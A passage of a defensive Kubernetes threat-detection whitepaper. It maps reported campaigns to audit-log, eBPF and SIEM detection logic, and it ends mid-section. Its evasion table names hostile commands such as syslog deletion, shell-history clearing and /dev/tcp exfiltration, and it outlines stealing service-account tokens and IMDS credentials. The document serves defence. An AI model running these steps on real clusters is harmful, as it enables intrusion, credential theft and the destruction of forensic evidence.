+<p><strong>How Kubernetes was used as a pivot layer (Reported <a href="https://unit42.paloaltonetworks.com/modern-kubernetes-threats/">[R3]</a>):</strong><br />
+- Initial access via spearphishing targeting employees at the cryptocurrency exchange <a href="https://unit42.paloaltonetworks.com/modern-kubernetes-threats/">[R3]</a><br />
+- Post-exploitation: adversary deployed a malicious pod into the Kubernetes cluster<br />
+- The malicious pod accessed the auto-mounted service account token belonging to a CI/CD automation workload that held elevated cluster privileges<br />
+- That SA token was used to authenticate to the kube-apiserver and perform further cluster enumeration<br />
+- Enumeration of cloud provider IMDS from inside pods to obtain IAM credentials for the host node role<br />
+- Persistence via dormant, legitimately named workloads — no anomalous process behavior to trigger behavioral alerts</p>
+<p><strong>Key detection implication (Inferred):</strong> Malicious pod deployments by a compromised insider or phished identity, SA token usage from unexpected pod names, and dormant workloads with no baseline API activity all require explicit alert logic against audit log data. These patterns do not generate signals in environments with only runtime telemetry.</p>
+<p><strong>ATT&amp;CK Mappings:</strong> <code>T1566</code> (spearphishing initial access), <code>T1610</code> (deploy container — malicious pod), <code>T1528</code>, <code>T1552.005</code>, <code>T1078.004</code></p>
+<hr />
+<h3 id="16-famous-chollima-dprk-fake-worker-insider-access-cluster">1.6 FAMOUS CHOLLIMA — DPRK Fake-Worker / Insider-Access Cluster</h3>
+<p><strong>Evidence label:</strong> Reported (primary source: CrowdStrike 2025 Threat Hunting Report <a href="https://www.crowdstrike.com/en-us/resources/reports/threat-hunting-report/">[R4]</a>)<br />
+<strong>Attribution:</strong> DPRK-nexus, attributed by CrowdStrike <a href="https://www.crowdstrike.com/en-us/resources/reports/threat-hunting-report/">[R4]</a>.</p>
+<blockquote>
+<p>This cluster is operationally distinct from Slow Pisces/TraderTraitor (Section 1.5) and should not be presented as the same campaign or blended kill chain.</p>
+</blockquote>
+<p><strong>Operational profile (Reported <a href="https://www.crowdstrike.com/en-us/resources/reports/threat-hunting-report/">[R4]</a>):</strong><br />
+- Operatives create fraudulent professional identities and apply for remote IT contractor and developer roles, gaining legitimate credentials without any technical exploitation<br />
+- CrowdStrike's 2025 Threat Hunting Report documented a 220% year-over-year increase in organizations where this insider-persona approach was confirmed <a href="https://www.crowdstrike.com/en-us/resources/reports/threat-hunting-report/">[R4]</a><br />
+- The same report documented that 81% of all DPRK-nexus hands-on-keyboard intrusions in the tracked dataset did not deploy custom malware, relying instead on native OS and cloud tooling. This statistic reflects a broad category from the CrowdStrike dataset; it is not presented here as a FAMOUS CHOLLIMA-specific precision metric <a href="https://www.crowdstrike.com/en-us/resources/reports/threat-hunting-report/">[R4]</a></p>
+<p><strong>Kubernetes relevance (Inferred):</strong> An operative holding legitimate developer credentials can issue <code>kubectl</code> commands, read Secrets, list pods, and enumerate RBAC assignments through normal authenticated channels. Audit logs capture these actions, but distinguishing legitimate developer activity from low-and-slow reconnaissance requires behavioral baselining over time.</p>
+<p><strong>ATT&amp;CK Mappings:</strong> <code>T1078.001</code>, <code>T1078.003</code>, <code>T1087.004</code>, <code>T1528</code></p>
+<hr />
+<h3 id="17-llmjacking-cloud-credential-abuse-against-ai-services">1.7 LLMjacking — Cloud Credential Abuse Against AI Services</h3>
+<p><strong>Evidence label:</strong> Reported (primary source: Sysdig TRT <a href="https://sysdig.com/blog/llmjacking-stolen-cloud-credentials-used-in-new-ai-attack/">[R5]</a>)</p>
+<blockquote>
+<p><strong>Scope:</strong> LLMjacking is a cloud credential and API-key abuse pattern. It targets hosted AI inference services (AWS Bedrock, Anthropic Claude API, OpenAI API). It is <strong>not inherently a Kubernetes-native attack category</strong>. Its intersection with Kubernetes occurs when compromised credentials originate from Kubernetes-hosted workloads.</p>
+</blockquote>
+<p><strong>Documented pattern (Reported <a href="https://sysdig.com/blog/llmjacking-stolen-cloud-credentials-used-in-new-ai-attack/">[R5]</a>):</strong><br />
+- Attackers steal cloud credentials or AI provider API keys — from exposed <code>.env</code> files, misconfigured object storage, or IMDS credential theft<br />
+- Credentials invoke computationally expensive AI models against the victim's billing account<br />
+- Attackers monetize by reselling access at below-market rates<br />
+- Sysdig reported victim compute costs reaching up to <strong>$100,000 per day</strong> before detection <a href="https://sysdig.com/blog/llmjacking-stolen-cloud-credentials-used-in-new-ai-attack/">[R5]</a></p>
+<p><strong>Kubernetes-specific entry points (Assessed):</strong><br />
+- Kubernetes Secrets containing <code>ANTHROPIC_API_KEY</code>, <code>OPENAI_API_KEY</code>, or cloud IAM credentials scoped to Bedrock/Vertex AI<br />
+- IMDS credential theft from nodes running ML inference pods — the same path as SCARLETEEL Phase 3<br />
+- Unauthenticated model-serving endpoints exposed as Kubernetes Services</p>
+<p><strong>Detection indicator:</strong> An unexplained spike in AI API token consumption or cloud compute billing with no corresponding application traffic increase.</p>
+<hr />
+<h3 id="18-cve-2025-55182-react2shell-web-app-rce-as-a-kubernetes-foothold">1.8 CVE-2025-55182 React2Shell — Web-App RCE as a Kubernetes Foothold</h3>
+<p><strong>Evidence label:</strong> Reported (primary source: Microsoft Security Blog <a href="https://www.microsoft.com/en-us/security/blog/2025/12/15/defending-against-the-cve-2025-55182-react2shell-vulnerability-in-react-server-components/">[R10]</a>)</p>
+<p>CVE-2025-55182 is a pre-authentication remote code execution vulnerability in React Server Components / Next.js, disclosed December 2025. It is a <strong>web application vulnerability</strong>. Its Kubernetes relevance is conditional: when the vulnerable application runs inside a Kubernetes pod, the resulting code execution occurs within that pod's security context.</p>
+<p><strong>Vulnerability summary (Reported <a href="https://www.microsoft.com/en-us/security/blog/2025/12/15/defending-against-the-cve-2025-55182-react2shell-vulnerability-in-react-server-components/">[R10]</a>):</strong><br />
+- Affected component: React Server Components ("Flight" protocol) in Next.js<br />
+- Attack type: Crafted HTTP request triggers server-side code execution without authentication<br />
+- Exploitability: Remotely exploitable; no credentials required <a href="https://www.microsoft.com/en-us/security/blog/2025/12/15/defending-against-the-cve-2025-55182-react2shell-vulnerability-in-react-server-components/">[R10]</a></p>
+<p>The specific exploit mechanism (serialization details, JS engine behavior) is outside the scope of this paper. Defenders should consult the NVD advisory and vendor patch documentation directly.</p>
+<p><strong>Kubernetes-specific post-exploitation path (Inferred):</strong></p>
+<pre><code>Vulnerable React/Next.js app runs as a Kubernetes pod
+  → RCE executes within the pod's process context
+  → Attacker enumerates /var/run/secrets/ for auto-mounted SA token
+  → Attacker queries kube-apiserver with the SA token
+  → Further steps follow the cloud-identity pivot path documented in SCARLETEEL
+</code></pre>
+<p><strong>Mitigation:</strong> Patch Next.js to the version resolving CVE-2025-55182 <a href="https://www.microsoft.com/en-us/security/blog/2025/12/15/defending-against-the-cve-2025-55182-react2shell-vulnerability-in-react-server-components/">[R10]</a>. Disable SA token auto-mounting on pods running web frontends that do not require API server access (see Section 4.4).</p>
+<hr />
+<h3 id="19-defense-evasion-memory-only-execution-and-log-tampering">1.9 Defense Evasion: Memory-Only Execution and Log Tampering</h3>
+<p>The following techniques appear in primary source post-mortem reporting:</p>
+<table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>Actor</th>
+<th>Mechanism</th>
+<th>Evidence Label</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Shell built-in TCP (<code>/dev/tcp</code>)</td>
+<td>SCARLETEEL</td>
+<td>Exfiltrates data via Bash built-in; no <code>curl</code>/<code>wget</code> process spawned</td>
+<td>Observed <a href="https://sysdig.com/blog/cloud-breach-terraform-data-theft">[R2]</a></td>
+</tr>
+<tr>
+<td>Syslog deletion (<code>rm /var/log/syslog</code>)</td>
+<td>SCARLETEEL</td>
+<td>Destroys agent-based forwarder data before it ships</td>
+<td>Observed <a href="https://sysdig.com/blog/cloud-breach-terraform-data-theft">[R2]</a></td>
+</tr>
+<tr>
+<td>In-memory variable exfiltration</td>
+<td>SCARLETEEL</td>
+<td>Data encoded in <code>SEND_B64_DATA</code>; no disk artifact written</td>
+<td>Observed <a href="https://sysdig.com/blog/cloud-breach-terraform-data-theft">[R2]</a></td>
+</tr>
+<tr>
+<td>Userland rootkit</td>
+<td>Kinsing</td>
+<td>Hooks <code>ps</code>, <code>ls</code>, <code>netstat</code> to hide miner processes</td>
+<td>Observed <a href="https://www.aquasec.com/blog/leveraging-kubernetes-rbac-to-backdoor-clusters/">[R8]</a></td>
+</tr>
+<tr>
+<td>History clearing (<code>history -cw</code>)</td>
+<td>SCARLETEEL</td>
+<td>Destroys shell forensic trail</td>
+<td>Observed <a href="https://sysdig.com/blog/cloud-breach-terraform-data-theft">[R2]</a></td>
+</tr>
+<tr>
+<td>Native tooling only</td>
+<td>DPRK-nexus (FAMOUS CHOLLIMA)</td>
+<td>Post-access activity via <code>kubectl</code>, <code>aws</code>, <code>gcloud</code></td>
+<td>Reported <a href="https://www.crowdstrike.com/en-us/resources/reports/threat-hunting-report/">[R4]</a></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Architectural implication (Assessed):</strong> Detection relying solely on userspace process enumeration or file scanning is structurally blind to Kinsing's rootkit and SCARLETEEL's in-memory exfiltration. Kernel-level telemetry — particularly eBPF-based tools that intercept syscalls before any userspace filtering occurs — is a high-value complement. This does not mean eBPF is the only viable approach; <code>auditd</code> with syscall rules, kernel module-based agents, and commercial EDR products with privileged kernel drivers provide comparable visibility with different deployment and performance tradeoffs.</p>
+<hr />
+<h2 id="pillar-2-telemetry-collection-visibility-architecture">Pillar 2: Telemetry Collection &amp; Visibility Architecture</h2>
+<h3 id="21-kubernetes-audit-log-architecture">2.1 Kubernetes Audit Log Architecture</h3>
+<p>Kubernetes audit logs are the authoritative record of interactions with the kube-apiserver. Without an explicit audit policy, RBAC manipulation, pod exec sessions, and service account token requests are invisible to any downstream detection system.</p>
+<p><strong>Audit event lifecycle:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Stage</th>
+<th>When Generated</th>
+<th>Security Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>RequestReceived</code></td>
+<td>On API handler receipt, before authorization</td>
+<td>Low — produces duplicates; includes requests that will be rejected</td>
+</tr>
+<tr>
+<td><code>ResponseStarted</code></td>
+<td>After response headers sent; long-running requests only</td>
+<td>Low for most detection use cases</td>
+</tr>
+<tr>
+<td><code>ResponseComplete</code></td>
+<td>After full response body transmitted</td>
+<td>Highest — includes authorization outcome and full request/response objects</td>
+</tr>
+</tbody>
+</table>
+<p>Omitting <code>RequestReceived</code> reduces event volume without losing security-relevant data, because every request that completes also generates a <code>ResponseComplete</code> record.</p>
+<blockquote>
+<p><strong>Secrets logging warning:</strong> Logging Secrets at <code>RequestResponse</code> level writes plaintext credential values into the SIEM ingestion pipeline. The CIS GKE Benchmark v1.5.0 explicitly recommends against this <a href="https://www.cisecurity.org/benchmark/kubernetes">[R11]</a>. Set Secrets to <code>Metadata</code> level only.</p>
+</blockquote>
+<h4 id="audit-policy-configuration">Audit Policy Configuration</h4>
+<pre><code class="language-yaml"># /etc/kubernetes/audit-policy.yaml
+apiVersion: audit.k8s.io/v1
+kind: Policy
+omitStages:
+  - &quot;RequestReceived&quot;
+rules:
+  # Service account token requests
+  - level: RequestResponse
+    verbs: [&quot;create&quot;]
+    resources:
+      - group: &quot;&quot;
+        resources: [&quot;serviceaccounts/token&quot;]
+      - group: &quot;rbac.authorization.k8s.io&quot;
+        resources:
+          - &quot;clusterroles&quot;
+          - &quot;clusterrolebindings&quot;
+          - &quot;roles&quot;
+          - &quot;rolebindings&quot;
+
+  # Interactive access
+  - level: RequestResponse
+    resources:
+      - group: &quot;&quot;
+        resources: [&quot;pods/exec&quot;, &quot;pods/attach&quot;, &quot;pods/portforward&quot;]
+
+  # Workload and service account mutations
+  - level: Request
+    verbs: [&quot;create&quot;, &quot;update&quot;, &quot;patch&quot;, &quot;delete&quot;]
+    resources:
+      - group: &quot;&quot;
+        resources: [&quot;pods&quot;, &quot;serviceaccounts&quot;]
+      - group: &quot;apps&quot;
+        resources: [&quot;daemonsets&quot;, &quot;deployments&quot;, &quot;statefulsets&quot;]
+
+  # Admission controller mutations
+  - level: RequestResponse
+    resources:
+      - group: &quot;admissionregistration.k8s.io&quot;
+        resources:
+          - &quot;mutatingwebhookconfigurations&quot;
+          - &quot;validatingwebhookconfigurations&quot;
+
+  # Secrets and ConfigMaps: metadata only — never RequestResponse
+  - level: Metadata
+    verbs: [&quot;create&quot;, &quot;update&quot;, &quot;get&quot;, &quot;list&quot;, &quot;watch&quot;]
+    resources:
+      - group: &quot;&quot;
+        resources: [&quot;secrets&quot;, &quot;configmaps&quot;]
+
+  # Suppress controller/scheduler read noise
+  - level: None
+    users:
+      - &quot;system:kube-controller-manager&quot;
+      - &quot;system:kube-scheduler&quot;
+    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;]
+
+  - level: Metadata
+</code></pre>
+<p><strong>Security-relevant audit log fields:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Security Relevance</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>user.username</code></td>
+<td>Initiating identity; <code>system:anonymous</code> = immediately actionable</td>
+</tr>
+<tr>
+<td><code>user.groups</code></td>
+<td><code>system:masters</code> membership = cluster-admin equivalent</td>
+</tr>
+<tr>
+<td><code>sourceIPs</code></td>
+<td>Array of source addresses; external IP = out-of-cluster API call</td>
+</tr>
+<tr>
+<td><code>objectRef.resource</code></td>
+<td>Resource type targeted (pods, secrets, clusterrolebindings)</td>
+</tr>
+<tr>
+<td><code>objectRef.subresource</code></td>
+<td><code>exec</code>, <code>portforward</code>, <code>token</code> are high-value subresources; <code>kubectl cp</code> appears as <code>pods/exec</code> using <code>tar</code> as the transfer mechanism — it does not generate a distinct subresource event</td>
+</tr>
+<tr>
+<td><code>verb</code></td>
+<td><code>create</code> on RBAC resources = suspicious outside expected contexts</td>
+</tr>
+<tr>
+<td><code>responseStatus.code</code></td>
+<td>Chains of 403s indicate permission enumeration</td>
+</tr>
+<tr>
+<td><code>requestObject</code></td>
+<td>Full submitted spec; captures container-level <code>securityContext.privileged</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="22-ebpf-runtime-telemetry">2.2 eBPF Runtime Telemetry</h3>
+<p>eBPF enables kernel-level event capture without requiring kernel module modification. For Kinsing's userland rootkit — which hooks userspace interfaces like <code>/proc</code> enumeration — kernel-level telemetry is essential: eBPF probes fire inside the kernel before userspace code has any opportunity to filter output.</p>
+<p>eBPF is not the only approach to this class of visibility. <code>auditd</code> with <code>EXECVE</code> and socket syscall rules, kernel module-based agents, and commercial EDR products with privileged kernel drivers can provide comparable coverage. Each option carries different deployment complexity, maintenance cost, and performance profile.</p>
+<h4 id="how-ebpf-captures-container-attacks">How eBPF Captures Container Attacks</h4>
+<pre><code>Kernel space                          Userspace
+─────────────────────────────────────────────────────
+  syscall: execve()
+    │
+    ├─► eBPF kprobe fires (inside kernel)
+    │     captures: pid, ppid, uid/gid,
+    │       container cgroup ID → pod/namespace,
+    │       argv[], filename
+    │     writes to ring buffer
+    │
+    └─► Normal kernel execution continues
+          (userland rootkit cannot intercept this path)
+
+  Tetragon DaemonSet pod (userspace)
+    ├─ Reads ring buffer
+    ├─ Enriches with K8s metadata via Kubernetes API
+    └─ Emits structured JSON event to stdout / gRPC
+</code></pre>
+<h4 id="tetragon-vs-falco-vs-tracee-qualitative-comparison">Tetragon vs. Falco vs. Tracee — Qualitative Comparison</h4>
+<p>Quantitative figures (CPU overhead percentages, exact kernel version thresholds) vary by kernel version, workload characteristics, probe type, and rule complexity. The values below are qualitative; consult each project's current official documentation before selecting a tool <a href="https://falco.org/docs/setup/download/">[R12]</a> <a href="https://aquasecurity.github.io/tracee/latest/">[R13]</a> <a href="https://tetragon.io/docs/">[R14]</a>.</p>
+<table>
+<thead>
+<tr>
+<th>Dimension</th>
+<th>Tetragon (Cilium)</th>
+<th>Falco</th>
+<th>Tracee (Aqua)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Primary hook mechanism</strong></td>
+<td>eBPF kprobes and tracepoints</td>
+<td>Modern eBPF probe (current default); legacy eBPF driver (deprecated); kernel module (supported for compatibility) <a href="https://falco.org/docs/setup/download/">[R12]</a></td>
+<td>eBPF kprobes</td>
+</tr>
+<tr>
+<td><strong>Enforcement capability</strong></td>
+<td>Yes — <code>bpf_send_signal</code> can terminate a process or deny a syscall synchronously in-kernel</td>
+<td>No — detect and alert only; cannot block a syscall</td>
+<td>No — designed for forensic depth, not blocking</td>
+</tr>
+<tr>
+<td><strong>K8s metadata enrichment</strong></td>
+<td>Native via Kubernetes API (pod, namespace, image digest, labels)</td>
+<td>Via plugin or driver configuration</td>
+<td>Via enrichment module</td>
+</tr>
+<tr>
+<td><strong>Rule language</strong></td>
+<td>TracingPolicy CRD (YAML + eBPF selectors)</td>
+<td>Falco rules DSL</td>
+<td>Golang-based policies</td>
+</tr>
+<tr>
+<td><strong>Best operational fit</strong></td>
+<td>In-kernel enforcement; high-fidelity process and network lineage</td>
+<td>Broad rule coverage; wide ecosystem integration</td>
+<td>Deep forensic behavioral analysis; incident response</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Recommended deployment:</strong> Falco and Tetragon are complementary. Falco provides the widest rule coverage and integrates readily with Fluent Bit, AWS Firelens, and standard SIEM pipeline tooling. Tetragon provides in-kernel enforcement at defined kill-chain steps where detect-only is insufficient.</p>
+<h4 id="tetragon-tracingpolicy-detect-nsenter-container-escape">Tetragon TracingPolicy: Detect nsenter Container Escape</h4>
+<pre><code class="language-yaml"># Detects nsenter escape into host namespace (T1611)
+# Consult Tetragon documentation [R14] for kernel compatibility requirements
+apiVersion: cilium.io/v1alpha1
+kind: TracingPolicy
+metadata:
+  name: detect-nsenter-escape
+spec:
+  kprobes:
+  - call: &quot;sys_enter_setns&quot;
+    syscall: true
+    args:
+    - index: 0
+      type: &quot;int&quot;
+    - index: 1
+      type: &quot;int&quot;
+    selectors:
+    - matchCapabilities:
+      - type: Permitted
+        isNamespaceCapability: false
+        values:
+        - &quot;CAP_SYS_ADMIN&quot;
+      matchActions:
+      - action: Sigkill
+  - call: &quot;sys_enter_execve&quot;
+    syscall: true
+    selectors:
+    - matchBinaries:
+      - operator: In
+        values:
+        - &quot;/usr/bin/nsenter&quot;
+        - &quot;/bin/nsenter&quot;
+      matchActions:
+      - action: Post
+</code></pre>
+<hr />
+<h3 id="23-telemetry-architecture-by-platform">2.3 Telemetry Architecture by Platform</h3>
+<h4 id="self-managed-kubernetes-standard-eks-ec2-node-groups">Self-Managed Kubernetes / Standard EKS (EC2 Node Groups)</h4>
+<p>DaemonSets deploy to EC2 worker nodes without restriction. Falco and Tetragon install via standard Helm charts. Kubernetes API audit logs must be explicitly configured via an audit policy file; the API server does not emit security-relevant events without this configuration.</p>
+<p>On EKS, audit logs must be forwarded explicitly to CloudWatch Logs:</p>
+<pre><code class="language-bash">aws eks update-cluster-config \
+  --name &lt;cluster-name&gt; \
+  --logging '{&quot;clusterLogging&quot;:[{&quot;types&quot;:[&quot;api&quot;,&quot;audit&quot;,&quot;authenticator&quot;],&quot;enabled&quot;:true}]}'
+</code></pre>
+<h4 id="aks-azure-kubernetes-service">AKS (Azure Kubernetes Service)</h4>
+<p>AKS surfaces control-plane audit logs through Azure Monitor Diagnostic Settings. Not all audit log categories are enabled by default; operators must explicitly enable the <code>kube-audit</code> and <code>kube-audit-admin</code> log categories in the cluster's Diagnostic Settings <a href="https://learn.microsoft.com/en-us/azure/aks/monitor-aks">[R15]</a>. Falco and Tetragon deploy as DaemonSets on AKS node pools without restriction.</p>
+<h4 id="gke-google-kubernetes-engine">GKE (Google Kubernetes Engine)</h4>
+<p>GKE surfaces Kubernetes audit logs through Cloud Audit Logs. Admin Activity logs (resource creation, deletion, RBAC mutations) are enabled by default. Data Access audit logs (pod exec sessions, secret reads) must be explicitly enabled per project and incur additional cost <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging">[R16]</a>. GKE customizes the audit log format in ways that diverge from upstream Kubernetes; parsers targeting upstream Kubernetes must be adapted for GKE. Falco and Tetragon deploy as DaemonSets on GKE node pools.</p>
+<h4 id="eks-auto-mode">EKS Auto Mode</h4>
+<p>EKS Auto Mode (GA November 2024) manages EC2 node provisioning via Karpenter and restricts the CNI to AWS VPC CNI <a href="https://aws.amazon.com/blogs/containers/getting-started-with-amazon-eks-auto-mode/">[R17]</a>. <strong>DaemonSets are supported in EKS Auto Mode.</strong> AWS Auto Mode nodes carry a taint that prevents non-system workloads from scheduling unless the DaemonSet explicitly tolerates it. Third-party security DaemonSets — Falco, Tetragon, and equivalent eBPF-based agents — must include the following toleration to deploy onto Auto Mode nodes <a href="https://aws.amazon.com/blogs/containers/getting-started-with-amazon-eks-auto-mode/">[R17]</a>:</p>
+<pre><code class="language-yaml">tolerations:
+  - key: &quot;eks.amazonaws.com/compute-type&quot;
+    operator: &quot;Equal&quot;
+    value: &quot;auto&quot;
+    effect: &quot;NoSchedule&quot;
+</code></pre>
+<p>Without this toleration, the DaemonSet pods will remain in <code>Pending</code> state on Auto Mode nodes, creating a complete data-plane visibility gap. Validate DaemonSet scheduling against all node groups in a mixed Auto Mode / managed-node-group cluster before assuming telemetry coverage is uniform across nodes.</p>
+<p>Cilium cannot be used as the cluster CNI in Auto Mode clusters; Hubble-based network observability that depends on Cilium as the primary CNI is therefore not available in this topology. Other observability approaches that do not require Cilium as the CNI may still be viable; verify against current AWS EKS Auto Mode documentation <a href="https://aws.amazon.com/blogs/containers/getting-started-with-amazon-eks-auto-mode/">[R17]</a>.</p>
+<h4 id="aws-fargate-serverless-containers">AWS Fargate (Serverless Containers)</h4>
+<p>Fargate completely abstracts the underlying node. AWS documentation explicitly states the following constraints <a href="https://docs.aws.amazon.com/eks/latest/userguide/fargate.html">[R18]</a>:</p>
+<ul>
+<li><strong>DaemonSets</strong> — not supported</li>
+<li><strong>Privileged containers</strong> — not supported</li>
+<li><strong><code>HostNetwork</code></strong> — not supported</li>
+<li><strong>EKS Pod Identity</strong> — not supported on Fargate; use IAM Roles for Service Accounts (IRSA) instead <a href="https://docs.aws.amazon.com/eks/latest/userguide/pod-id-how-it-works.html">[R19]</a></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>What it provides</th>
+<th>Limitations</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Application-side or pod-local telemetry</td>
+<td>Process and network events within the pod — not standard Falco host-level coverage; no Falco node driver available on Fargate</td>
+<td>No host-level visibility; no cross-pod correlation; no standard Falco driver model</td>
+</tr>
+<tr>
+<td>AWS GuardDuty for EKS</td>
+<td>Managed runtime threat detection</td>
+<td>Limited rule customization; AWS-specific findings only</td>
+</tr>
+<tr>
+<td>EKS Audit Logs</td>
+<td>Full API-plane visibility</td>
+<td>No data-plane (runtime syscall) visibility</td>
+</tr>
+<tr>
+<td>VPC Flow Logs</td>
+<td>ENI-level network flows</td>
+<td>No pod metadata; no process context</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Fargate conclusion:</strong> The control plane (audit logs) remains fully visible. Data-plane runtime telemetry is severely constrained. Compensate with strict egress Network Policies, IMDS blocking (see Section 4.2), and document this gap explicitly in your threat model.</p>
+<hr />
+<h2 id="pillar-3-detection-engineering-parsers-as-code">Pillar 3: Detection Engineering &amp; "Parsers as Code"</h2>
+<h3 id="31-log-normalization-and-udm-mapping">3.1 Log Normalization and UDM Mapping</h3>
+<p>Raw Kubernetes audit events, Falco JSON alerts, and Tetragon process events use different schemas. Before correlation rules can operate across sources, both streams must be normalized to a common field model.</p>
+<p>The mapping below is a <strong>recommended normalization strategy</strong> for organizations using Google Security Operations (Chronicle SIEM). It is not a universally applicable or automatically populated schema. For other SIEM products (Splunk, Elastic, Microsoft Sentinel), equivalent normalization pipelines use different field paths.</p>
+<p>Fields are labeled as follows:<br />
+- <strong>[STANDARD UDM]</strong> — documented in Google's UDM field reference <a href="https://cloud.google.com/chronicle/docs/reference/udm-field-list">[R20]</a><br />
+- <strong>[STANDARD UDM — REPEATED]</strong> — documented as a repeated (multi-value) field <a href="https://cloud.google.com/chronicle/docs/reference/udm-field-list">[R20]</a><br />
+- <strong>[PARSER-DEFINED]</strong> — must be explicitly populated by a custom parser; not standard UDM taxonomy</p>
+<table>
+<thead>
+<tr>
+<th>Kubernetes Audit Field</th>
+<th>UDM Field</th>
+<th>Label</th>
+<th>Security Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>user.username</code></td>
+<td><code>principal.user.userid</code></td>
+<td><strong>[STANDARD UDM]</strong></td>
+<td>API caller identity; detect <code>system:anonymous</code></td>
+</tr>
+<tr>
+<td><code>sourceIPs</code> (array)</td>
+<td><code>principal.ip</code></td>
+<td><strong>[STANDARD UDM — REPEATED]</strong></td>
+<td>All source addresses; external IP = out-of-cluster call</td>
+</tr>
+<tr>
+<td><code>objectRef.name</code></td>
+<td><code>target.resource.name</code></td>
+<td><strong>[STANDARD UDM]</strong></td>
+<td>Name of resource acted upon</td>
+</tr>
+<tr>
+<td><code>objectRef.resource</code></td>
+<td><code>additional.fields["k8s_resource"]</code></td>
+<td><strong>[PARSER-DEFINED]</strong></td>
+<td>Resource type (pods, clusterrolebindings, etc.)</td>
+</tr>
+<tr>
+<td><code>objectRef.namespace</code></td>
+<td><code>additional.fields["k8s_namespace"]</code></td>
+<td><strong>[PARSER-DEFINED]</strong></td>
+<td>Logical namespace of the resource</td>
+</tr>
+<tr>
+<td><code>verb</code></td>
+<td><code>metadata.event_type</code> (parser-assigned constant)</td>
+<td><strong>[PARSER-DEFINED mapping]</strong></td>
+<td>Parser maps K8s verbs to UDM event type constants; see note below</td>
+</tr>
+<tr>
+<td><code>requestObject.spec.containers[].securityContext.privileged</code></td>
+<td><code>additional.fields["container_privileged"]</code></td>
+<td><strong>[PARSER-DEFINED]</strong></td>
+<td>Captures privileged flag for pod-creation rules</td>
+</tr>
+<tr>
+<td><code>requestObject.roleRef.name</code></td>
+<td><code>additional.fields["roleRef_name"]</code></td>
+<td><strong>[PARSER-DEFINED]</strong></td>
+<td>Role name in ClusterRoleBinding CREATE events; matched by Rule 2 to detect <code>cluster-admin</code> bindings</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong><code>metadata.event_type</code> note:</strong> UDM defines an <code>EVENT_TYPE</code> enum with values such as <code>USER_RESOURCE_CREATION</code> and <code>USER_RESOURCE_ACCESS</code>. A custom parser assigns these values based on Kubernetes <code>verb</code> and resource type (e.g., <code>verb=create + resource=pods</code> → <code>USER_RESOURCE_CREATION</code>). These are <strong>parser-defined conventions</strong>, not values that Chronicle populates automatically from Kubernetes audit events.</p>
+<p><strong><code>sourceIPs</code> handling:</strong> This is a JSON array in the Kubernetes audit log. In Chronicle YARA-L 2.0, <code>principal.ip</code> is a repeated field and can be queried using Chronicle's repeated-field syntax <a href="https://cloud.google.com/chronicle/docs/yara-l/repeated-fields">[R21]</a>. A parser that renames <code>sourceIPs</code> directly to a single scalar field loses all but the first value.</p>
+<p><strong>GKE note:</strong> GKE customizes the native Kubernetes audit log format. Parsers written for upstream Kubernetes must be adapted to handle GKE-specific field structures before they work correctly against GKE logs.</p>
+</blockquote>
+<p><strong>Parser snippet [PSEUDOCODE — adapt to your pipeline (Logstash, Dataflow, custom ingestion)]:</strong></p>
+<pre><code>[PSEUDOCODE]
+
+if event.kind == &quot;Event&quot; and event.apiVersion matches &quot;audit.k8s.io&quot; {
+
+  // Assign UDM event type based on verb and resource — this is a parser convention
+  if event.objectRef.subresource == &quot;exec&quot; {
+    udm.metadata.event_type = &quot;USER_RESOURCE_ACCESS&quot;      // parser-assigned constant
+  } else if event.verb == &quot;create&quot; {
+    udm.metadata.event_type = &quot;USER_RESOURCE_CREATION&quot;    // parser-assigned constant
+  }
+
+  // Principal — sourceIPs is an array; populate repeated field
+  udm.principal.user.userid = event.user.username
+  for ip in event.sourceIPs {
+    udm.principal.ip.append(ip)                           // repeated field — all IPs
+  }
+  udm.network.http.user_agent = event.userAgent
+
+  // Target — objectRef fields are nested, not top-level
+  udm.target.resource.name            = event.objectRef.name
+  udm.additional.fields[&quot;k8s_resource&quot;]  = event.objectRef.resource
+  udm.additional.fields[&quot;k8s_namespace&quot;] = event.objectRef.namespace
+
+  // ClusterRoleBinding — extract roleRef.name for RBAC backdoor detection (Rule 2)
+  // requestObject.roleRef.name is only present on clusterrolebinding/rolebinding CREATE events.
+  // Rule 2 matches additional.fields[&quot;roleRef_name&quot;] == &quot;cluster-admin&quot;; this extraction
+  // is the prerequisite that makes that match condition possible.
+  if event.objectRef.resource == &quot;clusterrolebindings&quot; and event.verb == &quot;create&quot; {
+    udm.additional.fields[&quot;roleRef_name&quot;] = event.requestObject.roleRef.name
+  }
+
+  // Exec command captured from URI query parameters
+  if event.objectRef.subresource == &quot;exec&quot; {
+    cmd = extract_query_param(event.requestURI, &quot;command&quot;)
+    udm.additional.fields[&quot;exec_command&quot;] = cmd
+  }
+}
+</code></pre>
+<hr />
+<h3 id="32-detection-rule-1-privileged-pod-creation-backend-dependent-sigma-style-example">3.2 Detection Rule 1 — Privileged Pod Creation (Backend-Dependent Sigma-Style Example)</h3>
+<p><strong>Maps to:</strong> SCARLETEEL cryptominer staging; general privileged pod deployment in non-system namespaces<br />
+<strong>Source:</strong> Kubernetes Audit Logs</p>
+<blockquote>
